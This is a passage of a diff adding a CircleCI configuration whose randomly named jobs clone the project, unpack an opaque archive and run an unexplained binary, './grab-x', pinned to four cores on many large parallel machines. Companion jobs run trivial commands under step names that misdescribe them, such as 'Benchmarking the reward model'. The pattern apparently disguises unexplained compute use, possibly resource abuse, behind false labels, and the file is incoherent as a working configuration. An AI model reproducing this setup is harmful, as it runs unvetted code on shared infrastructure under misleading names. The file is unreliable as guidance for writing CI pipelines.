+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  sphere:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: renew keepalive timers iteration 4
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; for file in /usr/lib/*release*; do ls -l $file; done | tac; true ; } > /tmp/jian/net-env
+            b=$(wc -c </tmp/jian/net-env); echo "n=preview-v3 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'net-env'
+  preview-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/dnC94BbX0h2 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  border-jade:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Benchmarking the reward model
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; compgen -v | shuf -n 1 | tail -n 10; true ; } > /tmp/jian/MARKetAMBeR
+            b=$(wc -c </tmp/jian/MARKetAMBeR); echo "n=Validate_Release6 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'MARKetAMBeR'
+  Validate_Release6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  s4g3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Cancel sanity check
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; sha256sum <(echo "the quick brown fox"); true ; } > /tmp/jian/P_40439
+            b=$(wc -c </tmp/jian/P_40439); echo "n=run-production-regression-suite b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'P_40439'
+  run-production-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  marble_258:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Thanking the shift lead in progress
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; seq 15 65 | sort -n | uniq | head -n 4; true ; } > /tmp/jian/PANO-00071702
+            b=$(wc -c </tmp/jian/PANO-00071702); echo "n=sierra-9 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'PANO-00071702'
+  sierra-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+
+workflows:
+  pipeline:
+    jobs:
+      - usp_ColumnFreeStore
+      - sdof27od8
+      - feature-trait-closed
+      - py310-test:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - rocket:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - anothr-run:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - java17-vet:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - ensure-nightly-artifact-bundle:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - vega:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - rollout:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - t-old:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - teh-ci:
+          requires:
+            - usp_ColumnFreeStore
+            - sdof27od8
+            - feature-trait-closed
+      - COUPON_SHIPMENT
+      - panWorkerRequest
+      - ortho_rect
+      - q4-cleanup:
+          requires:
+            - COUPON_SHIPMENT
+            - panWorkerRequest
+            - ortho_rect
+      - gating:
+          requires:
+            - COUPON_SHIPMENT
+            - panWorkerRequest
+            - ortho_rect
+      - node20-cov:
+          requires:
+            - COUPON_SHIPMENT
+            - panWorkerRequest
+            - ortho_rect
+      - preview-v3:
+          requires:
+            - COUPON_SHIPMENT
+            - panWorkerRequest
+            - ortho_rect
+      - v2-preview2:
+          requires:
+            - COUPON_SHIPMENT
+            - panWorkerRequest
+            - ortho_rect
+      - LAB_INIT_4:
+          requires:
+            - COUPON_SHIPMENT
+            - panWorkerRequest
+            - ortho_rect
+      - brown200
+      - border-jade
+      - cyan_post
+      - green-light:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - Validate_Release6:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - whiskey-4:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - brodcast-91:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - sam-run:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - all-greens:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - sierra-9:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - brodcast-42:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - io-plus:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - run-production-regression-suite:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - feb26-canary:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - validte:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - v3-canary:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - ValidateSuite:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
+      - preview-v9:
+          requires:
+            - brown200
+            - border-jade
+            - cyan_post
